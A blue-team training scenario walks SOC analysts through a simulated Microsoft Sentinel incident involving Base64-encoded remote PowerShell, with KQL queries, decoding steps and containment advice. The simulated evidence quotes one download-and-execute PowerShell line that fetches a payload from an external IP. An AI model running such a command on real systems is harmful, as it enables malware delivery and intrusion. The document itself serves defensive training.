# 🔥 Microsoft Sentinel Investigation Scenario — Suspicious Remote PowerShell Activity

## 📌 Overview
This document provides a realistic, end-to-end Microsoft Sentinel investigation scenario suitable for SOC analyst training, labs, apprenticeship assessments, and blue-team exercises.

---

## 🧠 Scenario Background
At **03:12 AM**, Microsoft Sentinel generates a **high-severity incident**:

- **Incident Name:** Suspicious PowerShell Remote Execution  
- **Severity:** High  
- **Alerts:** 1  
- **Status:** New  
- **Entities:** User, Host, Process  

This analytics rule was triggered because a workstation executed remote PowerShell with Base64-encoded commands, a common tactic in malware delivery and lateral movement.

---

## 🧩 Sentinel Alert Details (Simulated)
**Alert Summary:**

- **User:** jason.raymond@company.co.uk  
- **Host:** WIN10-SALFRD-004  
- **Process:** powershell.exe  
- **Remote Host:** 192.168.54.22  
- **Encoded Command:** powershell.exe -enc JAB3AGM...  

_Base64-encoded PowerShell is a well-known indicator of compromise._

---

## 🧩 Evidence Found in Sentinel (Simulated)
<details>
<summary>1. Script Block Logging (Event 4104)</summary>

```text
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('hxxp://188.166.21.55/payload.ps1')
```
Shows an attempt to download and execute a remote PowerShell payload.

</details> <details> <summary>2. Logon Event (Event 4624)</summary>
```text
Account Name: jason.raymond
Logon Type: 3
Source Network Address: 192.168.54.22
```
Logon Type 3 indicates a network logon, often used in lateral movement.

</details> <details> <summary>3. Defender Alert (If Integrated)</summary>

Possible use of Remote PowerShell to run commands on another host.

</details>

## 🎯 Investigation Objectives
Your task as a SOC analyst is to answer the following:

Is the user account compromised?

Is the activity legitimate or malicious?

What script was downloaded?

Was lateral movement attempted?

Did the attacker run additional commands?

Did any other devices contact the malicious IP?

What containment steps should be taken?

## 🛠️ Investigation Steps (With KQL)

```kql
SecurityEvent
| where Account == "jason.raymond"
| where TimeGenerated between (datetime(2025-02-05 03:00) .. datetime(2025-02-05 03:30))
| project TimeGenerated, Computer, Process, CommandLine
| order by TimeGenerated asc
```
Expected: Only this PowerShell execution stands out.

```powershell
[System.Text.Encoding]::Unicode.GetString(
    [Convert]::FromBase64String("JAB3...")
)
```
Expected: A malicious script downloading remote content.
# 3. Check outbound network connections
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName == "powershell.exe"
| where DeviceName == "WIN10-SALFRD-004"
| where Timestamp > ago(2h)
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessCommandLine

```
Expected: Outbound connection to 188.166.21.xx — suspicious.

# 4. Check if other devices contacted that IP
```kql
DeviceNetworkEvents
| where RemoteIP == "188.166.21.55"
| project Timestamp, DeviceName, InitiatingProcessCommandLine
```


# 5. Look for lateral movement events (Logon Type 3)

```kql
Copy code
SecurityEvent
| where EventID in (4624, 4625)
| where Account == "jason.raymond"
| project TimeGenerated, Computer, LogonType, IpAddress
```
Expected: Logon from 192.168.54.KK → suspicious internal host.

# 6. Check for persistence mechanisms (Scheduled Tasks)</summary>
```kql
Copy code
DeviceProcessEvents
| where FileName == "schtasks.exe"
| where Timestamp > ago(1d)
```
# 7. Review Entities Panel in Sentinel
Look for:

Involved user

Affected host

Malicious IP

PowerShell process

Any correlated Defender alerts


🧠 Analyst Summary (Expected Findings)
🚨 Confirmed account compromise

Indicators:

Suspicious PowerShell execution outside normal hours

Base64-encoded script = common malicious technique

Remote payload download

Malicious external IP communication

Logon Type 3 from unusual device

User does not normally perform admin tasks

This activity is not legitimate IT behaviour.

🛡️ Recommended Containment Actions
Immediate:

Disable user account

Reset password + enforce MFA reset

Isolate workstation via Defender for Endpoint

Block 188.166.21.55 across firewall

Invalidate active sessions

Remediation:

Full malware scan

Remove persistence (scheduled tasks, registry entries)

Review all logins by user in last 24–48 hours

Inspect the internal IP 192.168.54.22 for compromise

Recovery:

Rebuild the endpoint (recommended)

Monitor user for unusual sign-ins

📝 Incident Closure Notes
Classification: True Positive

Reason: Confirmed malicious PowerShell activity + external payload download

Severity: High

Summary:
Attacker used compromised credentials, performed remote PowerShell execution, downloaded malicious script, and attempted lateral movement. All evidence indicates a security breach requiring containment and remediation.

✅ Quick Reference Checklist
 Open incident in Sentinel

 Review alert details & entities

 Inspect Events tab for ScriptBlock/Logon events

 Decode suspicious Base64 PowerShell commands

 Check outbound connections & other hosts contacting malicious IP

 Review lateral movement (Logon Type 3)

 Look for persistence mechanisms

 Document findings in tasks/comments

 Apply containment, remediation, recovery steps

 Close incident with classification and severity

✔️ End of Scenario

